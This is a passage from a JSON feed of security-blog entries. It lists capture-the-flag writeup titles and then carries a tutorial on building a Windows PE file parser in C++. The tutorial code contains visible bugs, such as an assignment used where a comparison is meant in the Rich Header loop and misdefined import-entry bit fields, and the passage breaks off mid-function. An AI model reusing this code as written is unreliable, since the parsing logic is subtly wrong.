          "wordCount": 140,
          "title": "SSRF in Shopify Exchange to RCE",
          "imageUrl": null
        },
        {
          "id": "https://0xacb.com/2018/02/23/h1-202-writeup/",
          "author": null,
          "description": "I want to dedicate this writeup to my grandma, who passed away while I was finishing it. Descansa em Paz, Avó.",
          "link": "https://0xacb.com/2018/02/23/h1-202-writeup/",
          "publishedOn": "2018-02-23T00:00:00.000Z",
          "wordCount": 3188,
          "title": "H1-202 CTF - Writeup",
          "imageUrl": null
        },
        {
          "id": "https://0xacb.com/2017/11/20/h1-212-writeup/",
          "author": null,
          "description": "Intro Hackerone launched the H1212 CTF challenge on November 13. I’m going to show how I solved it in this post. Thanks @jobertabma and @NahamSec for this awesome challenge! It was fun!",
          "link": "https://0xacb.com/2017/11/20/h1-212-writeup/",
          "publishedOn": "2017-11-20T08:15:56.000Z",
          "wordCount": 985,
          "title": "H1-212 CTF - Writeup",
          "imageUrl": null
        },
        {
          "id": "https://0xacb.com/2017/11/19/hxp-flag-store/",
          "author": null,
          "description": "This challenge turned out to be very interesting. 15 teams managed to solve it. Thanks to my teammate @uid1000 for digging into the GLIBC internals!",
          "link": "https://0xacb.com/2017/11/19/hxp-flag-store/",
          "publishedOn": "2017-11-19T08:15:56.000Z",
          "wordCount": 1157,
          "title": "HXP CTF 2017 - Writeup",
          "imageUrl": null
        },
        {
          "id": "https://0xacb.com/2017/07/16/h1702-ctf/",
          "author": null,
          "description": "<div type=\"html\"/>",
          "link": "https://0xacb.com/2017/07/16/h1702-ctf/",
          "publishedOn": "2017-07-16T08:15:56.000Z",
          "wordCount": 12774,
          "title": "H1702 CTF 2017 - Writeups",
          "imageUrl": null
        },
        {
          "id": "https://0xacb.com/2017/06/25/google-ctf-food/",
          "author": null,
          "description": "This was the first challenge I solved while playing Google CTF, worth 191 points. In this writeup I’ll explain how I solved it, using both static and dynamic analysis techniques.",
          "link": "https://0xacb.com/2017/06/25/google-ctf-food/",
          "publishedOn": "2017-06-25T08:15:56.000Z",
          "wordCount": 1946,
          "title": "Google CTF - Writeup",
          "imageUrl": null
        }
      ]
    },
    {
      "title": "0xRick’s Blog",
      "feedUrl": "https://0xrick.github.io/feed.xml",
      "siteUrl": "https://0xrick.github.io/",
      "articles": [
        {
          "id": "https://0xrick.github.io/win-internals/pe8/",
          "author": null,
          "description": "A dive into the PE file format - LAB 1: Writing a PE Parser Introduction In the previous posts we’ve discussed the basic structure of PE files, In this post we’re going to apply this knowledge into building a PE file parser in c++ as a proof of concept. The parser we’re going to build will not be a full parser and is not intended to be used as a reliable tool, this is only an exercise to better understand the PE file structure. We’re going to focus on PE32 and PE32+ files, and we’ll only parse the following parts of the file: DOS Header Rich Header NT Headers Data Directories (within the Optional Header) Section Headers Import Table Base Relocations Table The code of this project can be found on my github profile. Initial Setup Process Outline We want out parser to follow the following process: Read a file. Validate that it’s a PE file. Determine whether it’s a PE32 or a PE32+. Parse out the following structures: DOS Header Rich Header NT Headers Section Headers Import Data Directory Base Relocation Data Directory Print out the following information: File name and type. DOS Header: Magic value. Address of new exe header. Each entry of the Rich Header, decrypted and decoded. NT Headers - PE file signature. NT Headers - File Header: Machine value. Number of sections. Size of Optional Header. NT Headers - Optional Header: Magic value. Size of code section. Size of initialized data. Size of uninitialized data. Address of entry point. RVA of start of code section. Desired Image Base. Section alignment. File alignment. Size of image. Size of headers. For each Data Directory: its name, RVA and size. For each Section Header: Section name. Section virtual address and size. Section raw data pointer and size. Section characteristics value. Import Table: For each DLL: DLL name. ILT and IAT RVAs. Whether its a bound import or not. for every imported function: Ordinal if ordinal/name flag is 1. Name, hint and Hint/Name table RVA if ordinal/name flag is 0. Base Relocation Table: For each block: Page RVA. Block size. Number of entries. For each entry: Raw value. Relocation offset. Relocation Type. winnt.h Definitions We will need the following definitions from the winnt.h header: Types: BYTE WORD DWORD QWORD LONG LONGLONG ULONGLONG Constants: IMAGE_NT_OPTIONAL_HDR32_MAGIC IMAGE_NT_OPTIONAL_HDR64_MAGIC IMAGE_NUMBEROF_DIRECTORY_ENTRIES IMAGE_DOS_SIGNATURE IMAGE_DIRECTORY_ENTRY_EXPORT IMAGE_DIRECTORY_ENTRY_IMPORT IMAGE_DIRECTORY_ENTRY_RESOURCE IMAGE_DIRECTORY_ENTRY_EXCEPTION IMAGE_DIRECTORY_ENTRY_SECURITY IMAGE_DIRECTORY_ENTRY_BASERELOC IMAGE_DIRECTORY_ENTRY_DEBUG IMAGE_DIRECTORY_ENTRY_ARCHITECTURE IMAGE_DIRECTORY_ENTRY_GLOBALPTR IMAGE_DIRECTORY_ENTRY_TLS IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT IMAGE_DIRECTORY_ENTRY_IAT IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR IMAGE_SIZEOF_SHORT_NAME IMAGE_SIZEOF_SECTION_HEADER Structures: IMAGE_DOS_HEADER IMAGE_DATA_DIRECTORY IMAGE_OPTIONAL_HEADER32 IMAGE_OPTIONAL_HEADER64 IMAGE_FILE_HEADER IMAGE_NT_HEADERS32 IMAGE_NT_HEADERS64 IMAGE_IMPORT_DESCRIPTOR IMAGE_IMPORT_BY_NAME IMAGE_BASE_RELOCATION IMAGE_SECTION_HEADER I took these definitions from winnt.h and added them to a new header called winntdef.h. winntdef.h: typedef unsigned char BYTE; typedef unsigned short WORD; typedef unsigned long DWORD; typedef unsigned long long QWORD; typedef unsigned long LONG; typedef __int64 LONGLONG; typedef unsigned __int64 ULONGLONG; #define ___IMAGE_NT_OPTIONAL_HDR32_MAGIC 0x10b #define ___IMAGE_NT_OPTIONAL_HDR64_MAGIC 0x20b #define ___IMAGE_NUMBEROF_DIRECTORY_ENTRIES 16 #define ___IMAGE_DOS_SIGNATURE 0x5A4D #define ___IMAGE_DIRECTORY_ENTRY_EXPORT 0 #define ___IMAGE_DIRECTORY_ENTRY_IMPORT 1 #define ___IMAGE_DIRECTORY_ENTRY_RESOURCE 2 #define ___IMAGE_DIRECTORY_ENTRY_EXCEPTION 3 #define ___IMAGE_DIRECTORY_ENTRY_SECURITY 4 #define ___IMAGE_DIRECTORY_ENTRY_BASERELOC 5 #define ___IMAGE_DIRECTORY_ENTRY_DEBUG 6 #define ___IMAGE_DIRECTORY_ENTRY_ARCHITECTURE 7 #define ___IMAGE_DIRECTORY_ENTRY_GLOBALPTR 8 #define ___IMAGE_DIRECTORY_ENTRY_TLS 9 #define ___IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG 10 #define ___IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT 11 #define ___IMAGE_DIRECTORY_ENTRY_IAT 12 #define ___IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT 13 #define ___IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR 14 #define ___IMAGE_SIZEOF_SHORT_NAME 8 #define ___IMAGE_SIZEOF_SECTION_HEADER 40 typedef struct __IMAGE_DOS_HEADER { WORD e_magic; WORD e_cblp; WORD e_cp; WORD e_crlc; WORD e_cparhdr; WORD e_minalloc; WORD e_maxalloc; WORD e_ss; WORD e_sp; WORD e_csum; WORD e_ip; WORD e_cs; WORD e_lfarlc; WORD e_ovno; WORD e_res[4]; WORD e_oemid; WORD e_oeminfo; WORD e_res2[10]; LONG e_lfanew; } ___IMAGE_DOS_HEADER, * ___PIMAGE_DOS_HEADER; typedef struct __IMAGE_DATA_DIRECTORY { DWORD VirtualAddress; DWORD Size; } ___IMAGE_DATA_DIRECTORY, * ___PIMAGE_DATA_DIRECTORY; typedef struct __IMAGE_OPTIONAL_HEADER { WORD Magic; BYTE MajorLinkerVersion; BYTE MinorLinkerVersion; DWORD SizeOfCode; DWORD SizeOfInitializedData; DWORD SizeOfUninitializedData; DWORD AddressOfEntryPoint; DWORD BaseOfCode; DWORD BaseOfData; DWORD ImageBase; DWORD SectionAlignment; DWORD FileAlignment; WORD MajorOperatingSystemVersion; WORD MinorOperatingSystemVersion; WORD MajorImageVersion; WORD MinorImageVersion; WORD MajorSubsystemVersion; WORD MinorSubsystemVersion; DWORD Win32VersionValue; DWORD SizeOfImage; DWORD SizeOfHeaders; DWORD CheckSum; WORD Subsystem; WORD DllCharacteristics; DWORD SizeOfStackReserve; DWORD SizeOfStackCommit; DWORD SizeOfHeapReserve; DWORD SizeOfHeapCommit; DWORD LoaderFlags; DWORD NumberOfRvaAndSizes; ___IMAGE_DATA_DIRECTORY DataDirectory[___IMAGE_NUMBEROF_DIRECTORY_ENTRIES]; } ___IMAGE_OPTIONAL_HEADER32, * ___PIMAGE_OPTIONAL_HEADER32; typedef struct __IMAGE_OPTIONAL_HEADER64 { WORD Magic; BYTE MajorLinkerVersion; BYTE MinorLinkerVersion; DWORD SizeOfCode; DWORD SizeOfInitializedData; DWORD SizeOfUninitializedData; DWORD AddressOfEntryPoint; DWORD BaseOfCode; ULONGLONG ImageBase; DWORD SectionAlignment; DWORD FileAlignment; WORD MajorOperatingSystemVersion; WORD MinorOperatingSystemVersion; WORD MajorImageVersion; WORD MinorImageVersion; WORD MajorSubsystemVersion; WORD MinorSubsystemVersion; DWORD Win32VersionValue; DWORD SizeOfImage; DWORD SizeOfHeaders; DWORD CheckSum; WORD Subsystem; WORD DllCharacteristics; ULONGLONG SizeOfStackReserve; ULONGLONG SizeOfStackCommit; ULONGLONG SizeOfHeapReserve; ULONGLONG SizeOfHeapCommit; DWORD LoaderFlags; DWORD NumberOfRvaAndSizes; ___IMAGE_DATA_DIRECTORY DataDirectory[___IMAGE_NUMBEROF_DIRECTORY_ENTRIES]; } ___IMAGE_OPTIONAL_HEADER64, * ___PIMAGE_OPTIONAL_HEADER64; typedef struct __IMAGE_FILE_HEADER { WORD Machine; WORD NumberOfSections; DWORD TimeDateStamp; DWORD PointerToSymbolTable; DWORD NumberOfSymbols; WORD SizeOfOptionalHeader; WORD Characteristics; } ___IMAGE_FILE_HEADER, * ___PIMAGE_FILE_HEADER; typedef struct __IMAGE_NT_HEADERS64 { DWORD Signature; ___IMAGE_FILE_HEADER FileHeader; ___IMAGE_OPTIONAL_HEADER64 OptionalHeader; } ___IMAGE_NT_HEADERS64, * ___PIMAGE_NT_HEADERS64; typedef struct __IMAGE_NT_HEADERS { DWORD Signature; ___IMAGE_FILE_HEADER FileHeader; ___IMAGE_OPTIONAL_HEADER32 OptionalHeader; } ___IMAGE_NT_HEADERS32, * ___PIMAGE_NT_HEADERS32; typedef struct __IMAGE_IMPORT_DESCRIPTOR { union { DWORD Characteristics; DWORD OriginalFirstThunk; } DUMMYUNIONNAME; DWORD TimeDateStamp; DWORD ForwarderChain; DWORD Name; DWORD FirstThunk; } ___IMAGE_IMPORT_DESCRIPTOR, * ___PIMAGE_IMPORT_DESCRIPTOR; typedef struct __IMAGE_IMPORT_BY_NAME { WORD Hint; char Name[100]; } ___IMAGE_IMPORT_BY_NAME, * ___PIMAGE_IMPORT_BY_NAME; typedef struct __IMAGE_BASE_RELOCATION { DWORD VirtualAddress; DWORD SizeOfBlock; } ___IMAGE_BASE_RELOCATION, * ___PIMAGE_BASE_RELOCATION; typedef struct __IMAGE_SECTION_HEADER { BYTE Name[___IMAGE_SIZEOF_SHORT_NAME]; union { DWORD PhysicalAddress; DWORD VirtualSize; } Misc; DWORD VirtualAddress; DWORD SizeOfRawData; DWORD PointerToRawData; DWORD PointerToRelocations; DWORD PointerToLinenumbers; WORD NumberOfRelocations; WORD NumberOfLinenumbers; DWORD Characteristics; } ___IMAGE_SECTION_HEADER, * ___PIMAGE_SECTION_HEADER; Custom Structures I defined the following structures to help with the parsing process. They’re defined in the PEFILE_CUSTOM_STRUCTS.h header. RICH_HEADER_INFO A structure to hold information about the Rich Header during processing. typedef struct __RICH_HEADER_INFO { int size; char* ptrToBuffer; int entries; } RICH_HEADER_INFO, * PRICH_HEADER_INFO; size: Size of the Rich Header (in bytes). ptrToBuffer: A pointer to the buffer containing the data of the Rich Header. entries: Number of entries in the Rich Header. RICH_HEADER_ENTRY A structure to represent a Rich Header entry. typedef struct __RICH_HEADER_ENTRY { WORD prodID; WORD buildID; DWORD useCount; } RICH_HEADER_ENTRY, * PRICH_HEADER_ENTRY; prodID: Type ID / Product ID. buildID: Build ID. useCount: Use count. RICH_HEADER A structure to represent the Rich Header. typedef struct __RICH_HEADER { PRICH_HEADER_ENTRY entries; } RICH_HEADER, * PRICH_HEADER; entries: A pointer to a RICH_HEADER_ENTRY array. ILT_ENTRY_32 A structure to represent a 32-bit ILT entry during processing. typedef struct __ILT_ENTRY_32 { union { DWORD ORDINAL : 16; DWORD HINT_NAME_TABE : 32; DWORD ORDINAL_NAME_FLAG : 1; } FIELD_1; } ILT_ENTRY_32, * PILT_ENTRY_32; The structure will hold a 32-bit value and will return the appropriate piece of information (using bit fields) when the member corresponding to that piece of information is accessed. ILT_ENTRY_64 A structure to represent a 64-bit ILT entry during processing. typedef struct __ILT_ENTRY_64 { union { DWORD ORDINAL : 16; DWORD HINT_NAME_TABE : 32; } FIELD_2; DWORD ORDINAL_NAME_FLAG : 1; } ILT_ENTRY_64, * PILT_ENTRY_64; The structure will hold a 64-bit value and will return the appropriate piece of information (using bit fields) when the member corresponding to that piece of information is accessed. BASE_RELOC_ENTRY A structure to represent a base relocation entry during processing. typedef struct __BASE_RELOC_ENTRY { WORD OFFSET : 12; WORD TYPE : 4; } BASE_RELOC_ENTRY, * PBASE_RELOC_ENTRY; OFFSET: Relocation offset. TYPE: Relocation type. PEFILE Our parser will represent a PE file as an object type of either PE32FILE or PE64FILE. These 2 classes only differ in some member definitions but their functionality is identical. Throughout this post we will use the code from PE64FILE. Definition The class is defined as follows: class PE64FILE { public: PE64FILE(char* _NAME, FILE* Ppefile); void PrintInfo(); private: char* NAME; FILE* Ppefile; int _import_directory_count, _import_directory_size; int _basreloc_directory_count; // HEADERS ___IMAGE_DOS_HEADER PEFILE_DOS_HEADER; ___IMAGE_NT_HEADERS64 PEFILE_NT_HEADERS; // DOS HEADER DWORD PEFILE_DOS_HEADER_EMAGIC; LONG PEFILE_DOS_HEADER_LFANEW; // RICH HEADER RICH_HEADER_INFO PEFILE_RICH_HEADER_INFO; RICH_HEADER PEFILE_RICH_HEADER; // NT_HEADERS.Signature DWORD PEFILE_NT_HEADERS_SIGNATURE; // NT_HEADERS.FileHeader WORD PEFILE_NT_HEADERS_FILE_HEADER_MACHINE; WORD PEFILE_NT_HEADERS_FILE_HEADER_NUMBER0F_SECTIONS; WORD PEFILE_NT_HEADERS_FILE_HEADER_SIZEOF_OPTIONAL_HEADER; // NT_HEADERS.OptionalHeader DWORD PEFILE_NT_HEADERS_OPTIONAL_HEADER_MAGIC; DWORD PEFILE_NT_HEADERS_OPTIONAL_HEADER_SIZEOF_CODE; DWORD PEFILE_NT_HEADERS_OPTIONAL_HEADER_SIZEOF_INITIALIZED_DATA; DWORD PEFILE_NT_HEADERS_OPTIONAL_HEADER_SIZEOF_UNINITIALIZED_DATA; DWORD PEFILE_NT_HEADERS_OPTIONAL_HEADER_ADDRESSOF_ENTRYPOINT; DWORD PEFILE_NT_HEADERS_OPTIONAL_HEADER_BASEOF_CODE; ULONGLONG PEFILE_NT_HEADERS_OPTIONAL_HEADER_IMAGEBASE; DWORD PEFILE_NT_HEADERS_OPTIONAL_HEADER_SECTION_ALIGNMENT; DWORD PEFILE_NT_HEADERS_OPTIONAL_HEADER_FILE_ALIGNMENT; DWORD PEFILE_NT_HEADERS_OPTIONAL_HEADER_SIZEOF_IMAGE; DWORD PEFILE_NT_HEADERS_OPTIONAL_HEADER_SIZEOF_HEADERS; ___IMAGE_DATA_DIRECTORY PEFILE_EXPORT_DIRECTORY; ___IMAGE_DATA_DIRECTORY PEFILE_IMPORT_DIRECTORY; ___IMAGE_DATA_DIRECTORY PEFILE_RESOURCE_DIRECTORY; ___IMAGE_DATA_DIRECTORY PEFILE_EXCEPTION_DIRECTORY; ___IMAGE_DATA_DIRECTORY PEFILE_SECURITY_DIRECTORY; ___IMAGE_DATA_DIRECTORY PEFILE_BASERELOC_DIRECTORY; ___IMAGE_DATA_DIRECTORY PEFILE_DEBUG_DIRECTORY; ___IMAGE_DATA_DIRECTORY PEFILE_ARCHITECTURE_DIRECTORY; ___IMAGE_DATA_DIRECTORY PEFILE_GLOBALPTR_DIRECTORY; ___IMAGE_DATA_DIRECTORY PEFILE_TLS_DIRECTORY; ___IMAGE_DATA_DIRECTORY PEFILE_LOAD_CONFIG_DIRECTORY; ___IMAGE_DATA_DIRECTORY PEFILE_BOUND_IMPORT_DIRECTORY; ___IMAGE_DATA_DIRECTORY PEFILE_IAT_DIRECTORY; ___IMAGE_DATA_DIRECTORY PEFILE_DELAY_IMPORT_DIRECTORY; ___IMAGE_DATA_DIRECTORY PEFILE_COM_DESCRIPTOR_DIRECTORY; // SECTION HEADERS ___PIMAGE_SECTION_HEADER PEFILE_SECTION_HEADERS; // IMPORT TABLE ___PIMAGE_IMPORT_DESCRIPTOR PEFILE_IMPORT_TABLE; // BASE RELOCATION TABLE ___PIMAGE_BASE_RELOCATION PEFILE_BASERELOC_TABLE; // FUNCTIONS // ADDRESS RESOLVERS int locate(DWORD VA); DWORD resolve(DWORD VA, int index); // PARSERS void ParseFile(); void ParseDOSHeader(); void ParseNTHeaders(); void ParseSectionHeaders(); void ParseImportDirectory(); void ParseBaseReloc(); void ParseRichHeader(); // PRINT INFO void PrintFileInfo(); void PrintDOSHeaderInfo(); void PrintRichHeaderInfo(); void PrintNTHeadersInfo(); void PrintSectionHeadersInfo(); void PrintImportTableInfo(); void PrintBaseRelocationsInfo(); }; The only public member beside the class constructor is a function called printInfo() which will print information about the file. The class constructor takes two parameters, a char array representing the name of the file and a file pointer to the actual data of the file. After that comes a long series of variables definitions, these class members are going to be used internally during the parsing process and we’ll mention each one of them later. In the end is a series of methods definitions, first two methods are called locate and resolve, I will talk about them in a minute. The rest are functions responsible for parsing different parts of the file, and functions responsible for printing information about the same parts. Constructor The constructor of the class simply sets the file pointer and name variables, then it calls the ParseFile() function. PE64FILE::PE64FILE(char* _NAME, FILE* _Ppefile) { NAME = _NAME; Ppefile = _Ppefile; ParseFile(); } The ParseFile() function calls the other parser functions: void PE64FILE::ParseFile() { // PARSE DOS HEADER ParseDOSHeader(); // PARSE RICH HEADER ParseRichHeader(); //PARSE NT HEADERS ParseNTHeaders(); // PARSE SECTION HEADERS ParseSectionHeaders(); // PARSE IMPORT DIRECTORY ParseImportDirectory(); // PARSE BASE RELOCATIONS ParseBaseReloc(); } Resolving RVAs Most of the time, we’ll have a RVA that we’ll need to change to a file offset. The process of resolving an RVA can be outlined as follows: Determine which section range contains that RVA: Iterate over all sections and for each section compare the RVA to the section virtual address and to the section virtual address added to the virtual size of the section. If the RVA exists within this range then it belongs to that section. Calculate the file offset: Subtract the RVA from the section virtual address. Add that value to the raw data pointer of the section. An example of this is locating a Data Directory. The IMAGE_DATA_DIRECTORY structure only gives us an RVA of the directory, to locate that directory we’ll need to resolve that address. I wrote two functions to do this, first one to locate the virtual address (locate()), second one to resolve the address (resolve()). int PE64FILE::locate(DWORD VA) { int index; for (int i = 0; i &lt; PEFILE_NT_HEADERS_FILE_HEADER_NUMBER0F_SECTIONS; i++) { if (VA &gt;= PEFILE_SECTION_HEADERS[i].VirtualAddress &amp;&amp; VA &lt; (PEFILE_SECTION_HEADERS[i].VirtualAddress + PEFILE_SECTION_HEADERS[i].Misc.VirtualSize)){ index = i; break; } } return index; } DWORD PE64FILE::resolve(DWORD VA, int index) { return (VA - PEFILE_SECTION_HEADERS[index].VirtualAddress) + PEFILE_SECTION_HEADERS[index].PointerToRawData; } locate() iterates over the PEFILE_SECTION_HEADERS array, compares the RVA as described above, then it returns the index of the appropriate section header within the PEFILE_SECTION_HEADERS array. Please note that in order for these functions to work we’ll need to parse out the section headers and fill the PEFILE_SECTION_HEADERS array first. We still haven’t discussed this part, but I wanted to talk about the address resolvers first. main function The main function of the program is fairly simple, it only does 2 things: Create a file pointer to the given file, and validate that the file was read correctly. Call INITPARSE() on the file, and based on the return value it decides between three actions: Exit. Create a PE32FILE object, call PrintInfo(), close the file pointer then exit. Create a PE64FILE object, call PrintInfo(), close the file pointer then exit. PrintInfo() calls the other print info functions. int main(int argc, char* argv[]) { if (argc != 2) { printf(\"Usage: %s [path to executable]\\n\", argv[0]); return 1; } FILE * PpeFile; fopen_s(&amp;PpeFile, argv[1], \"rb\"); if (PpeFile == NULL) { printf(\"Can't open file.\\n\"); return 1; } if (INITPARSE(PpeFile) == 1) { exit(1); } else if (INITPARSE(PpeFile) == 32) { PE32FILE PeFile_1(argv[1], PpeFile); PeFile_1.PrintInfo(); fclose(PpeFile); exit(0); } else if (INITPARSE(PpeFile) == 64) { PE64FILE PeFile_1(argv[1], PpeFile); PeFile_1.PrintInfo(); fclose(PpeFile); exit(0); } return 0; } INITPARSE() INITPARSE() is a function defined in PEFILE.cpp. Its only job is to validate that the given file is a PE file, then determine whether the file is PE32 or PE32+. It reads the DOS header of the file and checks the DOS MZ header, if not found it returns an error. After validating the PE file, it sets the file position to (DOS_HEADER.e_lfanew + size of DWORD (PE signature) + size of the file header) which is the exact offset of the beginning of the Optional Header. Then it reads a WORD, we know that the first WORD of the Optional Header is a magic value that indicates the file type, it then compares that word to IMAGE_NT_OPTIONAL_HDR32_MAGIC and IMAGE_NT_OPTIONAL_HDR64_MAGIC, and based on the comparison results it either returns 32 or 64 indicating PE32 or PE32+, or it returns an error. int INITPARSE(FILE* PpeFile) { ___IMAGE_DOS_HEADER TMP_DOS_HEADER; WORD PEFILE_TYPE; fseek(PpeFile, 0, SEEK_SET); fread(&amp;TMP_DOS_HEADER, sizeof(___IMAGE_DOS_HEADER), 1, PpeFile); if (TMP_DOS_HEADER.e_magic != ___IMAGE_DOS_SIGNATURE) { printf(\"Error. Not a PE file.\\n\"); return 1; } fseek(PpeFile, (TMP_DOS_HEADER.e_lfanew + sizeof(DWORD) + sizeof(___IMAGE_FILE_HEADER)), SEEK_SET); fread(&amp;PEFILE_TYPE, sizeof(WORD), 1, PpeFile); if (PEFILE_TYPE == ___IMAGE_NT_OPTIONAL_HDR32_MAGIC) { return 32; } else if (PEFILE_TYPE == ___IMAGE_NT_OPTIONAL_HDR64_MAGIC) { return 64; } else { printf(\"Error while parsing IMAGE_OPTIONAL_HEADER.Magic. Unknown Type.\\n\"); return 1; } } Parsing DOS Header ParseDOSHeader() Parsing out the DOS Header is nothing complicated, we just need to read from the beginning of the file an amount of bytes equal to the size of the DOS Header, then we can assign that data to the pre-defined class member PEFILE_DOS_HEADER. From there we can access all of the struct members, however we’re only interested in e_magic and e_lfanew. void PE64FILE::ParseDOSHeader() { fseek(Ppefile, 0, SEEK_SET); fread(&amp;PEFILE_DOS_HEADER, sizeof(___IMAGE_DOS_HEADER), 1, Ppefile); PEFILE_DOS_HEADER_EMAGIC = PEFILE_DOS_HEADER.e_magic; PEFILE_DOS_HEADER_LFANEW = PEFILE_DOS_HEADER.e_lfanew; } PrintDOSHeaderInfo() This function prints e_magic and e_lfanew values. void PE64FILE::PrintDOSHeaderInfo() { printf(\" DOS HEADER:\\n\"); printf(\" -----------\\n\\n\"); printf(\" Magic: 0x%X\\n\", PEFILE_DOS_HEADER_EMAGIC); printf(\" File address of new exe header: 0x%X\\n\", PEFILE_DOS_HEADER_LFANEW); } Parsing Rich Header Process To parse out the Rich Header we’ll need to go through multiple steps. We don’t know anything about the Rich Header, we don’t know its size, we don’t know where it’s exactly located, we don’t even know if the file we’re processing contains a Rich Header in the first place. First of all, we need to locate the Rich Header. We don’t know the exact location, however we have everything we need to locate it. We know that if a Rich Header exists, then it has to exist between the DOS Stub and the PE signature or the beginning of the NT Headers. We also know that any Rich Header ends with a 32-bit value Rich followed by the XOR key. One might rely on the fixed size of the DOS Header and the DOS Stub, however, the default DOS Stub message can be changed, so that size is not guaranteed to be fixed. A better approach would be to read from the beginning of the file to the start of the NT Headers, then search through that buffer for the Rich sequence, if found then we’ve successfully located the end of the Rich Header, if not found then most likely the file doesn’t contain a Rich Header. Once we’ve located the end of the Rich Header, we can read the XOR key, then go backwards starting from the Rich signature and keep XORing 4 bytes at a time until we reach the DanS signature which indicates the beginning of the Rich Header. After obtaining the position and the size of the Rich Header, we can normally read and process the data. ParseRichHeader() This function starts by allocating a buffer on the heap, then it reads e_lfanew size of bytes from the beginning of the file and stores the data in the allocated buffer. It then goes through a loop where it does a linear search byte by byte. In each iteration it compares the current byte and the byte the follows to 0x52 (R) and 0x69 (i). When the sequence is found, it stores the index in a variable then the loop breaks. char* dataPtr = new char[PEFILE_DOS_HEADER_LFANEW]; fseek(Ppefile, 0, SEEK_SET); fread(dataPtr, PEFILE_DOS_HEADER_LFANEW, 1, Ppefile); int index_ = 0; for (int i = 0; i &lt;= PEFILE_DOS_HEADER_LFANEW; i++) { if (dataPtr[i] == 0x52 &amp;&amp; dataPtr[i + 1] == 0x69) { index_ = i; break; } } if (index_ == 0) { printf(\"Error while parsing Rich Header.\"); PEFILE_RICH_HEADER_INFO.entries = 0; return; } After that it reads the XOR key, then goes into the decryption loop where in each iteration it increments RichHeaderSize by 4 until it reaches the DanS sequence. char key[4]; memcpy(key, dataPtr + (index_ + 4), 4); int indexpointer = index_ - 4; int RichHeaderSize = 0; while (true) { char tmpchar[4]; memcpy(tmpchar, dataPtr + indexpointer, 4); for (int i = 0; i &lt; 4; i++) { tmpchar[i] = tmpchar[i] ^ key[i]; } indexpointer -= 4; RichHeaderSize += 4; if (tmpchar[1] = 0x61 &amp;&amp; tmpchar[0] == 0x44) { break; } } After obtaining the size and the position, it allocates a new buffer for the Rich Header, reads and decrypts the Rich Header, updates PEFILE_RICH_HEADER_INFO with the appropriate data pointer, size and number of entries, then finally it deallocates the buffer it was using for processing. char* RichHeaderPtr = new char[RichHeaderSize]; memcpy(RichHeaderPtr, dataPtr + (index_ - RichHeaderSize), RichHeaderSize); for (int i = 0; i &lt; RichHeaderSize; i += 4) { for (int x = 0; x &lt; 4; x++) { RichHeaderPtr[i + x] = RichHeaderPtr[i + x] ^ key[x]; } } PEFILE_RICH_HEADER_INFO.size = RichHeaderSize; PEFILE_RICH_HEADER_INFO.ptrToBuffer = RichHeaderPtr; PEFILE_RICH_HEADER_INFO.entries = (RichHeaderSize - 16) / 8; delete[] dataPtr; The rest of the function reads each entry of the Rich Header and updates PEFILE_RICH_HEADER. PEFILE_RICH_HEADER.entries = new RICH_HEADER_ENTRY[PEFILE_RICH_HEADER_INFO.entries]; for (int i = 16; i &lt; RichHeaderSize; i += 8) { WORD PRODID = (uint16_t)((unsigned char)RichHeaderPtr[i + 3] &lt;&lt; 8) | (unsigned char)RichHeaderPtr[i + 2]; WORD BUILDID = (uint16_t)((unsigned char)RichHeaderPtr[i + 1] &lt;&lt; 8) | (unsigned char)RichHeaderPtr[i]; DWORD USECOUNT = (uint32_t)((unsigned char)RichHeaderPtr[i + 7] &lt;&lt; 24) | (unsigned char)RichHeaderPtr[i + 6] &lt;&lt; 16 | (unsigned char)RichHeaderPtr[i + 5] &lt;&lt; 8 | (unsigned char)RichHeaderPtr[i + 4]; PEFILE_RICH_HEADER.entries[(i / 8) - 2] = { PRODID, BUILDID, USECOUNT }; if (i + 8 &gt;= RichHeaderSize) { PEFILE_RICH_HEADER.entries[(i / 8) - 1] = { 0x0000, 0x0000, 0x00000000 }; } } delete[] PEFILE_RICH_HEADER_INFO.ptrToBuffer; Here’s the full function: void PE64FILE::ParseRichHeader() { char* dataPtr = new char[PEFILE_DOS_HEADER_LFANEW]; fseek(Ppefile, 0, SEEK_SET); fread(dataPtr, PEFILE_DOS_HEADER_LFANEW, 1, Ppefile); int index_ = 0; for (int i = 0; i &lt;= PEFILE_DOS_HEADER_LFANEW; i++) { if (dataPtr[i] == 0x52 &amp;&amp; dataPtr[i + 1] == 0x69) { index_ = i; break; } } if (index_ == 0) { printf(\"Error while parsing Rich Header.\"); PEFILE_RICH_HEADER_INFO.entries = 0; return; } char key[4]; memcpy(key, dataPtr + (index_ + 4), 4); int indexpointer = index_ - 4; int RichHeaderSize = 0; while (true) { char tmpchar[4]; memcpy(tmpchar, dataPtr + indexpointer, 4); for (int i = 0; i &lt; 4; i++) { tmpchar[i] = tmpchar[i] ^ key[i]; } indexpointer -= 4; RichHeaderSize += 4; if (tmpchar[1] = 0x61 &amp;&amp; tmpchar[0] == 0x44) { break; } } char* RichHeaderPtr = new char[RichHeaderSize]; memcpy(RichHeaderPtr, dataPtr + (index_ - RichHeaderSize), RichHeaderSize); for (int i = 0; i &lt; RichHeaderSize; i += 4) { for (int x = 0; x &lt; 4; x++) { RichHeaderPtr[i + x] = RichHeaderPtr[i + x] ^ key[x]; } } PEFILE_RICH_HEADER_INFO.size = RichHeaderSize; PEFILE_RICH_HEADER_INFO.ptrToBuffer = RichHeaderPtr; PEFILE_RICH_HEADER_INFO.entries = (RichHeaderSize - 16) / 8; delete[] dataPtr; PEFILE_RICH_HEADER.entries = new RICH_HEADER_ENTRY[PEFILE_RICH_HEADER_INFO.entries]; for (int i = 16; i &lt; RichHeaderSize; i += 8) { WORD PRODID = (uint16_t)((unsigned char)RichHeaderPtr[i + 3] &lt;&lt; 8) | (unsigned char)RichHeaderPtr[i + 2]; WORD BUILDID = (uint16_t)((unsigned char)RichHeaderPtr[i + 1] &lt;&lt; 8) | (unsigned char)RichHeaderPtr[i]; DWORD USECOUNT = (uint32_t)((unsigned char)RichHeaderPtr[i + 7] &lt;&lt; 24) | (unsigned char)RichHeaderPtr[i + 6] &lt;&lt; 16 | (unsigned char)RichHeaderPtr[i + 5] &lt;&lt; 8 | (unsigned char)RichHeaderPtr[i + 